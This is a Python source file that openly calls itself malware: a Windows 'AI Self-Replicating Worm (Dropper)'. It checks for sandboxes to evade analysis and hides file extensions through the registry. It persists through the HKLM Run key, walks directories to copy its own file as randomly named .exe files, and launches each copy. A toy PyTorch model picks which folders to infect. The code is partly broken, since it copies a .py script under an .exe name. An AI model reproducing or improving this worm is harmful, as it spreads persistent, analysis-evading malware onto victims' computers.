import torch
import torch.nn as nn
import torch.optim as optim
import argparse
import os
import shutil
import random
import psutil
import winreg
import time

class SimpleNN(nn.Module):
    def __init__(self):
        super(SimpleNN, self).__init__()
        self.fc1 = nn.Linear(2, 10)
        self.fc2 = nn.Linear(10, 1)
        self.sigmoid = nn.Sigmoid()

    def forward(self, x):
        x = torch.relu(self.fc1(x))
        x = self.sigmoid(self.fc2(x))
        return x

def get_own_binary():
    with open(__file__, 'rb') as f:
        return f.read()

def is_in_sandbox():
    if psutil.cpu_count() < 2:
        return True
    if psutil.virtual_memory().total / (1024**3) < 2:
        return True
    if psutil.boot_time() > time.time() - 300:
        return True
    return False

def hide_file_extensions():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "HideFileExt", 0, winreg.REG_DWORD, 1)
        print("[+] File extensions hidden")
    except:
        print("[-] Failed to hide file extensions")

def add_to_autorun():
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "SelfReplicatingWorm", 0, winreg.REG_SZ, __file__)
        print("[+] Added to autorun")
    except:
        print("[-] Failed to add to autorun")

def ai_decide_to_drop(file_count, depth):
    model = SimpleNN()
    optimizer = optim.Adam(model.parameters(), lr=0.001)
    criterion = nn.MSELoss()

    # Generate training data
    features = []
    labels = []
    for i in range(100):
        fc = (i % 20) + random.random() * 10
        d = (i % 5) + random.random() * 3
        should_drop = 1.0 if fc > 10 and d > 2 else 0.0
        features.append([fc, d])
        labels.append([should_drop])

    x = torch.tensor(features, dtype=torch.float32)
    y = torch.tensor(labels, dtype=torch.float32)

    # Train
    for _ in range(1000):
        optimizer.zero_grad()
        pred = model(x)
        loss = criterion(pred, y)
        loss.backward()
        optimizer.step()

    # Save model
    torch.save(model.state_dict(), 'worm_model.pth')
    print("[AI] Model saved to worm_model.pth")

    # Predict
    input_tensor = torch.tensor([[file_count, depth]], dtype=torch.float32)
    pred = model(input_tensor)
    decision = pred.item() > 0.5
    print(f"[AI] Directory has {file_count} files, depth {depth}, deciding to {'drop' if decision else 'skip'}")
    return decision

def drop_and_spawn_to_directory(target_dir, binary):
    random_name = f"worm_{random.randint(1000, 9999)}.exe"
    target_path = os.path.join(target_dir, random_name)
    try:
        with open(target_path, 'wb') as f:
            f.write(binary)
        print(f"[+] Dropped executable to: {target_path}")
        os.startfile(target_path)
        print(f"[+] Spawned process")
    except:
        print(f"[-] Failed to drop to: {target_path}")

def scan_and_spread():
    my_binary = get_own_binary()
    current_dir = os.getcwd()
    print(f"[*] AI Worm (Dropper) started at: {current_dir}")

    for root, dirs, files in os.walk(current_dir):
        dir_name = os.path.basename(root)
        depth = root.count(os.sep) - current_dir.count(os.sep)
        if dir_name not in ['__pycache__', 'System', 'Windows'] and ai_decide_to_drop(len(files), depth):
            drop_and_spawn_to_directory(root, my_binary)

def print_banner():
    print("AI Self-Replicating Worm (Dropper) v1.0")
    print("=====================================")
    print("Warning: This is malware. Use at your own risk.")
    print()

def main():
    print_banner()
    if is_in_sandbox():
        print("[-] Detected sandbox environment. Exiting.")
        return
    parser = argparse.ArgumentParser(description="AI Self-Replicating Worm")
    parser.add_argument('--scan', action='store_true', help='Scan and spread')
    parser.add_argument('--hide', action='store_true', help='Hide file extensions')
    parser.add_argument('--autorun', action='store_true', help='Add to autorun')
    args = parser.parse_args()
    run_all = not (args.scan or args.hide or args.autorun)

    if args.hide or run_all:
        hide_file_extensions()
    if args.autorun or run_all:
        add_to_autorun()
    if args.scan or run_all:
        scan_and_spread()

if __name__ == "__main__":
    main()